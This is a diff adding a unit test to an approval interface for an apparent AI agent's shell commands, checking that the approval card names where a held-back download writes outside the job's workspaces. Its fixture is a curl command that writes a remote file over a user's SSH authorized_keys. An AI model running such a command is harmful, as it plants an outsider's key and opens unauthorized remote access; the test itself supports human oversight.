@@ -749,6 +749,30 @@ describe('la carte dit ce que la liste de l’agent a vu (#464) @cap:approuver-u
     expect(items).toEqual(['Install software or packages', 'Delete files or discard changes']);
   });
 
+  // #614 : un téléchargement permis ne demande que s'il écrit hors des espaces
+  // du job ; la carte dit où, sinon la personne ne voit pas pourquoi.
+  it('dit où écrit un téléchargement retenu parce qu’il sort des espaces (#614)', async () => {
+    await monter(
+      demande({
+        toolName: 'run_command',
+        gateReasons: [
+          {
+            category: 'download',
+            state: 'ask',
+            details: ['curl -o /home/k/.ssh/authorized_keys https://x/k'],
+            outside: ['/home/k/.ssh/authorized_keys'],
+          },
+        ],
+      }),
+    );
+    const items = [...container!.querySelectorAll('[data-testid="approval-shell-reasons"] li')].map(
+      (e) => e.textContent,
+    );
+    expect(items).toEqual([
+      'Download files from the internet · outside its workspaces: /home/k/.ssh/authorized_keys',
+    ]);
+  });
+
   it('rien quand la liste n’y est pour rien', async () => {
     await monter(demande());
     expect(container!.querySelector('[data-testid="approval-shell-reasons"]')).toBeNull();
